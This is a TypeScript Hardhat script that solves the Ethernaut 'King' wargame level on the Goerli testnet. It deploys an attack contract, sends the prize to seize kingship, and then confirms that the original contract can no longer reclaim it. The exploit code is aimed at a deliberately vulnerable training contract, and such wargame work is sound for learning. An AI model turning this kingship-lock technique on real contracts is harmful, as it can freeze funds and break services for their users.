import { ethers } from "hardhat";
// import { expect } from "chai";
// import { Wallet } from "ethers";
// import { HardhatRuntimeEnvironment } from "hardhat/types";
// import deployContract from "../deploy/deployGeneric";
import { run } from "hardhat";

const attackVault = async () => {
    // change contract addresses here.
    const kingAddress = "0x3acAB497d1474153706206d5094805e9c047123F"; //type "await contract.address()" in ethernaut console
    const args: any[] = [];
    const player = process.env.PRIVATE_KEY || "";
    // [deployer] = await ethers.getSigners();

    // Don't touch below 🚀
    // Vulnerability comes from the possibility of making a malicious contract the king
    // Additional read to understand more on recieve and transfer to make the contract needed:
    // https://ethereum.stackexchange.com/questions/81994/what-is-the-receive-keyword-in-solidity/81995
    // https://docs.soliditylang.org/en/v0.8.10/types.html#members-of-addresses

    // deploying attack contract here
    // const deployed = await deployContract(hre, "EternalKing", args);
    // alternative below
    console.log("Deploying attack contract eternalKing...");
    const attack = await (await ethers.getContractFactory("EternalKing", player)).deploy();
    console.log(attack);
    console.log(`Attack contract deployed to ${attack.address}`);
    // experimantal verify below
    // if (eternalKing.address){
    //     console.log("Verifying contract...");
    //     try {
    //         await run("verify:verify", {
    //             address: eternalKing.address,
    //             constructorArguments: args,
    //         });
    //     } catch (e: any) {
    //         if (e.message.toLowerCase().includes("already verified")) {
    //             console.log("Already verified!");
    //         } else {
    //             console.log(e);
    //         }
    //     }
    // }

    // wallet
    // using my custom rpc stored in .env (for privacy)
    // const provider = ethers.getDefaultProvider("goerli"); // use this for default RPC provider
    const GOERLI_RPC_URL = process.env.GOERLI_RPC_URL;
    const provider = new ethers.providers.JsonRpcProvider(GOERLI_RPC_URL);
    const wallet = new ethers.Wallet(player, provider);
    console.log("Player's address is: ", wallet.address);

    // typing all commands in console below
    // type contract.abi in ethernaut to expose all ABI (change this only if there was an update in ethernaut and this is no longer the same)
    const ABI = [
        {
            constant: true,
            inputs: [],
            name: "_king",
            outputs: [{ internalType: "address", name: "", type: "address" }],
            payable: undefined,
            stateMutability: "view",
            type: "function",
        },
        {
            constant: true,
            inputs: [],
            name: "prize",
            outputs: [{ internalType: "uint256", name: "", type: "uint256" }],
            payable: undefined,
            stateMutability: "view",
            type: "function",
        },
        {
            constant: undefined,
            inputs: [],
            name: "owner",
            outputs: [{ internalType: "address", name: "", type: "address" }],
            payable: undefined,
            stateMutability: "nonpayable",
            type: "function",
        },
    ];
    const contract = await ethers.getContractAt(ABI, kingAddress);
    console.log("Checking current King and Prize...");
    let king = await contract._king();
    let prize = await contract.prize();
    let prizeC = ethers.utils.formatEther(prize);
    console.log(`Current King is: ${king}`);
    console.log(`Current Prize is: ${prizeC}`);
    console.log("Making EternalKing Contract as the new king...");
    const tx1 = await attack.claimKingship(kingAddress, { value: prize });
    const tx1Receipt = await tx1.wait();
    console.log(tx1Receipt);
    console.log("Now checking if kingship could be reclaimed...");
    try {
        await wallet.sendTransaction({ from: wallet.address, to: kingAddress, value: prize });
        console.log("Please review code above and try again...");
    } catch (err) {
        console.log(err);
        console.log("Congrats! Level passed, please submit to ethernaut");
    }
};

attackVault()
    .then(() => process.exit(0))
    .catch((error) => {
        console.error(error);
        process.exit(1);
    });
